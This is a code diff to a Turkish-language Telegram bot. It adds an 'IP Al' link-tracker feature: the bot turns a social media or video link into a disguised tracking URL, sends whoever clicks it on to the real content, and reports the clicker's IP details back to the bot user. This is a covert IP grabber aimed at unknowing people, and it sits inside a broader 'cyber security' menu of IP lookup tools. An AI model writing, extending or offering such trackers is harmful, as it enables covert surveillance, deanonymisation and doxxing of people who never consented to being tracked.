@@ -5208,11 +5208,30 @@ async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 InlineKeyboardButton(strings.get('btn_ip', '🌐 IP Sorgula'), callback_data='menu_ip'),
                 InlineKeyboardButton('🛡️ IP Analiz', callback_data='menu_ip_analiz')
             ],
+            [InlineKeyboardButton('📡 IP Al (Link İzleyici)', callback_data='menu_iplogger')],
             [InlineKeyboardButton(strings['btn_back'], callback_data='menu_siber_guvenlik')]
         ]
         await query.edit_message_text(
             strings.get('ip_sorgu_welcome', '🌐 **IP Sorgu Menüsü**\n\nAşağıdan sorgu türünü seçin:'),
             reply_markup=InlineKeyboardMarkup(ip_klavye), parse_mode='Markdown'
+        )
+    elif query.data == 'menu_iplogger':
+        context.user_data['mevcut_kategori'] = '🛡️ Siber Güvenlik › IP Al'
+        await log_kanali_gonder(context.bot, update, kategori='🛡️ Siber Güvenlik', komut='📡 IP Al (Link İzleyici)')
+        geri = InlineKeyboardMarkup([[InlineKeyboardButton(strings['btn_back'], callback_data='menu_ip_sorgu')]])
+        context.user_data['durum'] = 'iplogger_bekliyor'
+        await query.edit_message_text(
+            "📡 **IP AL — LİNK İZLEYİCİ**\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+            "Bir sosyal medya veya video linki gönder:\n\n"
+            "📌 _Örnek:_\n"
+            "`https://www.tiktok.com/@kullanici/video/...`\n"
+            "`https://www.instagram.com/p/...`\n"
+            "`https://www.youtube.com/watch?v=...`\n\n"
+            "Bot sana özel bir izleme linki üretecek\\.\n"
+            "Linke tıklayan kişinin IP bilgileri buraya gelecek\\.",
+            reply_markup=geri,
+            parse_mode='MarkdownV2'
         )
     elif query.data == 'menu_azr_special':
         context.user_data['mevcut_kategori'] = '⭐ AZR Özel'
@@ -7226,6 +7245,39 @@ async def gelen_mesajlari_yonet(update: Update, context: ContextTypes.DEFAULT_TY
         except Exception as e:
             logger.error(f"IP analiz menü hatası: {e}")
             await bekle.edit_text("❌ Analiz sırasında bir hata oluştu.")
+        return
+
+    if context.user_data.get('durum') == 'iplogger_bekliyor':
+        context.user_data['durum'] = None
+        raw = update.message.text.strip()
+        if not raw.startswith('http'):
+            await update.message.reply_text(
+                "❌ Geçersiz link. `https://` ile başlayan bir link gönder.",
+                parse_mode='Markdown'
+            )
+            return
+        import secrets as _sec
+        import tracking_store as _ts
+        token = _sec.token_urlsafe(10)
+        chat_id = update.effective_chat.id
+        _ts.save(token, raw, chat_id)
+        domain = os.environ.get('REPLIT_DEV_DOMAIN', 'localhost:5000')
+        izleme_linki = f"https://{domain}/track/{token}"
+        geri = InlineKeyboardMarkup([
+            [InlineKeyboardButton('📡 Yeni Link Oluştur', callback_data='menu_iplogger')],
+            [InlineKeyboardButton('🔙 IP Sorgu', callback_data='menu_ip_sorgu')]
+        ])
+        await update.message.reply_text(
+            f"✅ *İzleme linki oluşturuldu\\!*\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"📎 Aşağıdaki linki paylaş:\n\n"
+            f"`{izleme_linki}`\n\n"
+            f"👆 Bu linke tıklayan kişi orijinal içeriğe ulaşır\\.\n"
+            f"IP bilgileri anında bu sohbete gelir\\.\n\n"
+            f"🔗 _Hedef:_ `{raw[:60]}{'...' if len(raw)>60 else ''}`",
+            reply_markup=geri,
+            parse_mode='MarkdownV2'
+        )
         return
 
     if context.user_data.get('durum') == 'sasi_bekliyor':
